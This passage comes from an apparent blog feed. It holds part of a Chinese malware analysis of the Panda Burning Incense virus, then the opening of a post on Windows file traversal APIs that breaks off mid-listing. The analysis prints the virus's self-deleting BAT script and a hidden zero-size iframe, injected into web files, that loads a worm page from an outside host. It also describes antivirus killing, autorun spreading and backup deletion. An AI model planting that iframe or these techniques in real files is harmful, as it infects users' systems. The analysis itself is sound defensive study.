src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/17.png"></p><p>然后将自身复制到C:\Windows\system32\drives\spcolsv.exe，运行spcolsv.exe，再退出当前进程。</p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/18.png"></p><p>下面来看一下如果是被感染的EXE文件会有哪些操作。</p><h4 id="被感染的EXE文件"><a href="#被感染的EXE文件" class="headerlink" title="被感染的EXE文件"></a>被感染的EXE文件</h4><p>如果是一个被感染的EXE文件，那么在这里进行了文件结尾的读取，一个文件被感染的话，结尾会多出一段数据</p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/15.png"></p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/13.png"></p><p>被感染文件结尾的标识</p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/19.png"></p><p>如果此时是一个被感染的EXE文件，此时比较的结果如下图所示。</p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/14.png"></p><p>被感染文件，在这里会进行跳转，可以看到此时eax值是文件结尾标识的大小，结尾标识如上图，0x17=23。</p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/20.png"></p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/21.png"></p><p>之后会创建一个原文件名后面加上.exe的文件</p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/22.png"></p><p>然后会在C:\Users\admin\AppData\Local\Temp下创建一个BAT文件，并且执行这个BAT文件，并且判断当前是否存在spcolsv.exe进程，存在的话将其关闭，然后会将病毒文件分离出来，复制到C:\Windows\system32\drives\spcolsv.exe，然后运行它，自身退出。</p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/23.png"></p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/25.png"></p><p>执行这个BAT文件。</p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/24.png"></p><p>查看bat文件的内容</p><figure class="highlight ceylon"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs ceylon">:<span class="hljs-keyword">try</span><span class="hljs-number">1</span><br>del <span class="hljs-string">&quot;C:\1\aaa.exe&quot;</span><br><span class="hljs-keyword">if</span> exist <span class="hljs-string">&quot;C:\1\aaa.exe&quot;</span> goto <span class="hljs-keyword">try</span><span class="hljs-number">1</span><br>ren <span class="hljs-string">&quot;C:\1\aaa.exe.exe&quot;</span> <span class="hljs-string">&quot;aaa.exe&quot;</span><br><span class="hljs-keyword">if</span> exist <span class="hljs-string">&quot;C:\1\aaa.exe.exe&quot;</span> goto <span class="hljs-keyword">try</span><span class="hljs-number">2</span><br><span class="hljs-string">&quot;C:\1\aaa.exe&quot;</span><br>:<span class="hljs-keyword">try</span><span class="hljs-number">2</span><br>del %<span class="hljs-number">0</span><br></code></pre></div></td></tr></table></figure><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>操作1到这里基本就结束了，panda.exe会将自身复制到驱动目录下，命名为spcolsv.exe，然后以spcolsv.exe继续运行。如果是被感染的exe文件，会先创建一个BAT文件，用于执行原程序，然后将病毒主体分离出来，继续运行。只要当前电脑上还存在一个被感染的exe文件，那么病毒就永远不会被清除。</p><h3 id="操作2"><a href="#操作2" class="headerlink" title="操作2"></a>操作2</h3><p>进入操作2，其中有三个函数，分开来看这三个函数。</p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/26.png"></p><h4 id="函数1，sub-40A7EC"><a href="#函数1，sub-40A7EC" class="headerlink" title="函数1，sub_40A7EC"></a>函数1，sub_40A7EC</h4><p>这里创建了一个线程</p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/27.png"></p><p>下断分析这里，这里获取了所有的磁盘，然后开始进行感染。</p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/28.png"></p><p>getDriveType（sub_4076B4)函数，遍历所有的盘符，从A到Z，然后保存起来，以便后续进行感染。</p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/29.png"></p><p>感染函数中，开始进行文件的搜索，搜索当前盘符下所有的文件，比如C盘，就是C:\*.*，关于文件搜索的一些内容可以查看这里<a href="https://b1ackie.cn/2021/08/17/%E5%8A%9F%E8%83%BD%E6%8A%80%E6%9C%AF-%E6%96%87%E4%BB%B6%E9%81%8D%E5%8E%86/">文件遍历</a>。</p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/30.png"></p><p>如果是文件夹的话还要进行判断，排除了一些系统的目录，本身目录和上级目录”.”，”..”。</p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/31.png"></p><p>然后会判断当前目录中是否存在desktop.ini文件，如果不存在则会创建一个，向其中写入年月日。</p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/33.png"></p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/32.png"></p><p>存在的话就会判断其中的时间是否与当前时间相等，如果相等，则判断当前文件已经被感染就会跳过，如果不相等则继续感染，修改文件中的时间。</p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/34.png"></p><p>然后就是对于文件的操作，判断文件的类型执行相应的操作。如果是.GHO文件，也就是备份文件，就会将其删除。</p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/35.png"></p><p>获取文件的大小，如果文件大小超过0xA00000就不再继续感染，如果文件名字是setup.exe和NTDETECT.COM也不进行感染。</p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/36.png"></p><p>获取扩展名然后判断是否等于exe,scr,pid,com，如果是这几种文件类型就会执行40800C函数进行感染。</p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/37.png"></p><p>然后是网页类型文件是否是htm，html，asp，php，jsp，aspx，如果是这几种类型就会执行407ADC函数进行感染。</p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/38.png"></p><p>现在来着重看一下可执行文件与网页文件的感染方式。</p><h5 id="网页文件感染方式（sub-407ADC）"><a href="#网页文件感染方式（sub-407ADC）" class="headerlink" title="网页文件感染方式（sub_407ADC）"></a>网页文件感染方式（sub_407ADC）</h5><p>对于这类文件主要是在原文件的后面加上一个新的标签，其感染过程如下，它会读取文件内容，然后通过比较文件内容，看当前文件是否已经存在感染的标签判断其是否被感染过</p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/39.png"></p><p>之后会进行感染，在文件的末尾加上一个iframe标签</p><figure class="highlight routeros"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs routeros">&lt;iframe <span class="hljs-attribute">src</span>=http://www.krvkr.com/worm.htm <span class="hljs-attribute">width</span>=0 <span class="hljs-attribute">height</span>=0&gt;&lt;/iframe&gt;<br></code></pre></div></td></tr></table></figure><p>感染后的文件内容</p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/40.png"></p><h5 id="可执行文件感染方式（sub-40800C）"><a href="#可执行文件感染方式（sub-40800C）" class="headerlink" title="可执行文件感染方式（sub_40800C）"></a>可执行文件感染方式（sub_40800C）</h5><p>首先是判断当前程序是否正在运行，如果正在运行的话，就不感染，然后读取文件内容，比对感染标志WhBoy判断是否已经被感染，如果已经被感染的话，就不再进行感染。感染过程是将病毒复制进被感染程序之中，修改图标，在末尾再加上一个感染标志。</p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/41.png"></p><p>感染标志</p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/42.png"></p><p>感染前后文件大小对比</p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/%E5%8E%9F%E6%96%87%E4%BB%B6%E5%A4%A7%E5%B0%8F.png"></p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/%E6%84%9F%E6%9F%93%E5%90%8E%E6%96%87%E4%BB%B6%E5%A4%A7%E5%B0%8F.png"></p><p>感染后的文件大小等于原文件大小加上病毒大小（60.5kb）。</p><h4 id="函数2，sub-40C5B0"><a href="#函数2，sub-40C5B0" class="headerlink" title="函数2，sub_40C5B0"></a>函数2，sub_40C5B0</h4><p>这个函数创建了一个定时器，每隔6S就执行一次。</p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/43.png"></p><p>首先还是获取了所有的磁盘。</p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/45.png"></p><p>然后是判断当前根目录下是否存在setup.exe这个文件，如果不存在将病毒主体复制过去并命名为setup.exe，如果存在的话又会读取spcolsv.exe和setup.exe的内容，判断是否相同，也就是判断setup.exe是不是病毒程序，如果不相等会将原setup.exe删除再重新复制一个。都满足的话继续后续的操作。</p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/44.png"></p><p>然后是对于autorun.inf的判断，也是先判断根目录下是否存在这个文件，如果不存在创建并写入内容，如果存在比对内容是否为病毒生成的内容，如果不是，则删除原始的，生成一个新的。流程与setup.exe基本上是一样的。</p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/46.png"></p><p>autorun.inf的内容</p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/47.png"></p><p>最后会调用SetFileAttributesA函数将两个文件的属性设置为隐藏。</p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/48.png"></p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/%E6%96%87%E4%BB%B6%E5%B1%9E%E6%80%A7%E9%9A%90%E8%97%8F.png"></p><h4 id="函数3，sub-40BD08"><a href="#函数3，sub-40BD08" class="headerlink" title="函数3，sub_40BD08"></a>函数3，sub_40BD08</h4><p>这个函数也是创建了一个线程，是循环创建了好几次，下断分析查看。</p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/49.png"></p><p>进来分析查看，其是创建了SOCKET通信，通过139和445端口感染局域网的共享文件夹。</p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/50.png"></p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/51.png"></p><p>这里我没有设置好环境，没有实现局域网感染，所以分析的可能不是很到位。</p><h4 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h4><p>操作2主要是创建了几个线程，sub_40A7EC是用来感染电脑盘符下的可执行文件和网页类型文件，还会在每个文件夹下创建一个desktop.ini写入当前感染的时间。sub_40C5B0每隔6S就会执行一次，遍历所有的盘符，判断盘符根目录下是否存在setup.exe（也就是病毒主体程序）和autorun.inf。sub_40BD08通过网络进行传播，可以看出来熊猫烧香的感染性，传播性确实很强。</p><h3 id="操作3"><a href="#操作3" class="headerlink" title="操作3"></a>操作3</h3><p>进来查看发现创建了四个定时器</p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/52.png"></p><p>分开分析它们</p><h4 id="定时1，sub-40CD30函数"><a href="#定时1，sub-40CD30函数" class="headerlink" title="定时1，sub_40CD30函数"></a>定时1，sub_40CD30函数</h4><p>这个函数每一秒执行一次，进来后首先创建了一个线程，然后是两个对于注册表的操作，先分析一下创建的这个线程。</p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/54.png"></p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/53.png"></p><h5 id="创建的线程"><a href="#创建的线程" class="headerlink" title="创建的线程"></a>创建的线程</h5><p>这个线程主要是病毒的一个自我保护，其中关闭了杀毒软件，</p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/55.png"></p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/56.png"></p><p>还会检测关闭许多的进程，比如说无法打开任务管理器，注册表编辑器。</p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/57.png"></p><h5 id="注册表操作"><a href="#注册表操作" class="headerlink" title="注册表操作"></a>注册表操作</h5><p>针对注册表操作主要是两个，一个是在HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run中设置键值，实现自启动</p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/58.png"></p><p>另一个是修改SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Folder\Hidden\SHOWALL\CheckedValue键值，实现不显示隐藏文件。</p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/60.png"></p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/59.png"></p><h4 id="定时2，sub-40CE8C函数"><a href="#定时2，sub-40CE8C函数" class="headerlink" title="定时2，sub_40CE8C函数"></a>定时2，sub_40CE8C函数</h4><p>这个函数每1200S运行一次（20分钟）。</p><p>它首先创建了一个线程</p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/61.png"></p><p>分析此线程，发现其打开了一个URL并且尝试读取一些内容。</p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/62.png"></p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/63.png"></p><p>并且还有一个执行的操作，猜测应该是从网页中获取到的程序来运行。</p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/64.png"></p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/65.png"></p><h4 id="定时3，sub-40CE94函数"><a href="#定时3，sub-40CE94函数" class="headerlink" title="定时3，sub_40CE94函数"></a>定时3，sub_40CE94函数</h4><p>每十秒执行一次。</p><p>进来后先创建了两个线程。</p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/66.png"></p><p>第一个线程最终会创建40C964，这个之前已经分析过了</p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/67.png"></p><p>第二个线程40CC38，它是删除了所有的共享文件夹。</p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/68.png"></p><h4 id="定时4，sub-407540函数"><a href="#定时4，sub-407540函数" class="headerlink" title="定时4，sub_407540函数"></a>定时4，sub_407540函数</h4><p>它每隔6s执行一次，创建了一个线程</p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/69.png"></p><p>这里主要是关闭并删除了一些服务和将一些杀软的启动项删除，</p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/70.png"></p><p>关闭服务</p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/71.png"></p><p>删除服务</p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/72.png"></p><p>删除启动项</p><p><img src="/2021/08/19/%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/73.png"></p><h4 id="总结-2"><a href="#总结-2" class="headerlink" title="总结"></a>总结</h4><p>这里主要是四个功能</p><ol><li>第一个是每秒执行关闭杀软和一些其他进程，设置自启动键值和不显示隐藏文件。</li><li>第二个每隔20分钟执行一次，会尝试下载资源并运行。</li><li>第三个每隔十秒执行一次，删除所有的共享文件夹。</li><li>每六秒执行一次，关闭删除服务，并且删除杀软的启动项。</li></ol><h2 id="总结-3"><a href="#总结-3" class="headerlink" title="总结"></a>总结</h2><p>到这里整个熊猫烧香就分析完毕了，使用OD结合IDA也分析了比较长的时间，这也算是第一篇正式的一个病毒分析报告，写的可能还是有不成熟的地方，后续还要慢慢改进。</p>]]></content>
    
    
    <categories>
      
      <category>病毒分析</category>
      
    </categories>
    
    
    <tags>
      
      <tag>逆向工程</tag>
      
      <tag>病毒分析</tag>
      
      <tag>熊猫烧香</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>功能技术-文件遍历</title>
    <link href="/2021/08/17/%E5%8A%9F%E8%83%BD%E6%8A%80%E6%9C%AF-%E6%96%87%E4%BB%B6%E9%81%8D%E5%8E%86/"/>
    <url>/2021/08/17/%E5%8A%9F%E8%83%BD%E6%8A%80%E6%9C%AF-%E6%96%87%E4%BB%B6%E9%81%8D%E5%8E%86/</url>
    
    <content type="html"><![CDATA[<h2 id="文件遍历"><a href="#文件遍历" class="headerlink" title="文件遍历"></a>文件遍历</h2><p>文件搜索功能是应用程序中最常见的功能之一，同时对于恶意代码来说也是常见的功能，比如勒索病毒就会有大量的文件操作，遍历文件来对文件进行加密。</p><p>实现文件遍历的方法有很多，最常见的便是通过API实现，这里主要涉及的是FindFirstFile,FindNextFile以及FindClose等。</p><h2 id="函数介绍"><a href="#函数介绍" class="headerlink" title="函数介绍"></a>函数介绍</h2><h3 id="FindFirstFile"><a href="#FindFirstFile" class="headerlink" title="FindFirstFile"></a>FindFirstFile</h3><p>在目录中搜索名称与特定名称匹配的文件或者子目录。</p><figure class="highlight arduino"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs arduino"><span class="hljs-function">HANDLE <span class="hljs-title">FindFirstFile</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">  LPCSTR             lpFileName,</span></span><br><span class="hljs-params"><span class="hljs-function">  LPWIN32_FIND_DATAA lpFindFileData</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span>;<br></code></pre></div></td></tr></table></figure><h4 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h4><p>lpFileName：指定目录、路径、以及文件名。文件名可以包括通配符，例如“*”，“？”。此参数不应该为NULL，无效的字符串（例如，空字符串或缺少终止空字符的字符串），尾部以反斜杠（\）结尾。</p><p>如果字符串以通配符、句点“.”或者目录名称结尾，那么用户必须对路径上的根目录和所有子目录具有访问权限。</p><p>lpFindFileData：指向WIN32_FIND_DATA结构的指针，用于接收搜索到的文件或者目录的信息。</p><h4 id="返回值"><a href="#返回值" class="headerlink" title="返回值"></a>返回值</h4><p>如果函数成功，则返回值是在后续调用FindNextFile或者FindClose中使用的搜索句柄，lpFindFileData参数包含搜索到的第一个文件或者目录的信息。</p><p>如果函数失败或无法从lpFindFileData参数的搜索字符串中找到文件，则返回值为INVALID_HANDLE_VALUE，并且lpFindFileData的内容是不确定的。</p><h3 id="FindNextFile"><a href="#FindNextFile" class="headerlink" title="FindNextFile"></a>FindNextFile</h3><p>继续搜索文件</p><figure class="highlight arduino"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs arduino"><span class="hljs-function">BOOL <span class="hljs-title">FindNextFile</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">  HANDLE             hFindFile,</span></span><br><span class="hljs-params"><span class="hljs-function">  LPWIN32_FIND_DATAA lpFindFileData</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span>;<br></code></pre></div></td></tr></table></figure><h4 id="参数-1"><a href="#参数-1" class="headerlink" title="参数"></a>参数</h4><p>hFindFile：指向前一次调用FindFirstFile或者FindFirstFileEx函数返回的搜索句柄。</p><p>lpFindFileData：指向WIN32_FIND_DATA结构的指针，该结构接收搜索到的文件或子目录的信息。</p><h4 id="返回值-1"><a href="#返回值-1" class="headerlink" title="返回值"></a>返回值</h4><p>如果函数成功，则返回值不为0，lpFindFileData参数包含搜索到的下一个文件或者目录的信息。如果函数失败，则返回值为0，并且lpFindFileData的内容是不确定的。</p><h3 id="WIN32-FIND-DATAA-结构"><a href="#WIN32-FIND-DATAA-结构" class="headerlink" title="WIN32_FIND_DATAA 结构"></a>WIN32_FIND_DATAA 结构</h3><figure class="highlight elm"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs elm">typedef struct _WIN32_FIND_DATAA &#123;<br>  <span class="hljs-type">DWORD</span>    dwFileAttributes;<br>  <span class="hljs-type">FILETIME</span> ftCreationTime;<br>  <span class="hljs-type">FILETIME</span> ftLastAccessTime;<br>  <span class="hljs-type">FILETIME</span> ftLastWriteTime;<br>  <span class="hljs-type">DWORD</span>    nFileSizeHigh;<br>  <span class="hljs-type">DWORD</span>    nFileSizeLow;<br>  <span class="hljs-type">DWORD</span>    dwReserved0;<br>  <span class="hljs-type">DWORD</span>    dwReserved1;<br>  <span class="hljs-type">CHAR</span>     cFileName[<span class="hljs-type">MAX_PATH</span>];<br>  <span class="hljs-type">CHAR</span>     cAlternateFileName[14];<br>  <span class="hljs-type">DWORD</span>    dwFileType;<br>  <span class="hljs-type">DWORD</span>    dwCreatorType;<br>  <span class="hljs-type">WORD</span>     wFinderFlags;<br>&#125; <span class="hljs-type">WIN32_FIND_DATAA</span>, *<span class="hljs-type">PWIN32_FIND_DATAA</span>, *<span class="hljs-type">LPWIN32_FIND_DATAA</span>;<br></code></pre></div></td></tr></table></figure><h4 id="成员"><a href="#成员" class="headerlink" title="成员"></a>成员</h4><p>dwFileAttributes：指定文件的文件属性。</p><p>ftCreationTime：指定文件或者目录何时创建的FILETIME结构。如果底层文件系统不支持创建时间，则此成员为0。</p><p>ftLastAccessTime：对于文件，结构指定文件最后读取、写入或者运行可执行文件的时间。</p><p>ftLastWriteTime：对于文件，该结构指定文件上次写入、截断或者覆盖的时间。</p><p>nFileSizeHigh：指定文件大小的高阶DWORD值，以字节为单位。</p><p>nFileSizeLow：指定文件大小的低阶DWORD值，以字节为单位。</p><p>dwReserved0：若dwFileAttributes成员包含FILE_ATTRIBUTE_REPARSE_POINT属性，则此成员将指定重新标记解析点。若此值未定义，则不应该使用。</p><p>dwReserved1：保留</p><p>cFileName：指向文件的名称。</p><p>cAlternateFileName：指向该文件的替代名称。</p><h2 id="实现原理"><a href="#实现原理" class="headerlink" title="实现原理"></a>实现原理</h2><p>文件的搜索功能主要是通过FindFirstFile和FindNextFile这两个函数来实现的。</p><p>首先是搜索的路径，假设当前要搜索C盘下所有的文件，那么路径就是”C:\\“，指定搜索所有的文件就加上通配符”*“，现在的路径就是”C:\\*.*“。</p><p>然后就可以调用FindFirstFile函数，进行搜索，搜索的结果保存在WIN32_FIND_DATA结构体指针指向的内存中。结构体中包含文件的各项信息。可以根据成员dwFileAttributes判断文件的属性，若文件属性是FILE_ATTRIBUTE_DIRECTORY，则说明这是一个目录，可以进行再次搜索，但是要注意要过滤掉当前目录“.”和上级目录“..”，根据cFileName获取文件的名称。</p><p>之后再调用FindNextFile函数搜索下一个文件即可，重复上述操作，直到根据返回值判断，搜索不到文件。</p><p>最后调用FindClose关闭搜索句柄。</p><h2 id="编写代码"><a href="#编写代码" class="headerlink" title="编写代码"></a>编写代码</h2><p>结果太多，为了结果更好展示，将其输出到TXT文件中。搜索时再加入一个判断，只输出exe类型文件。</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span 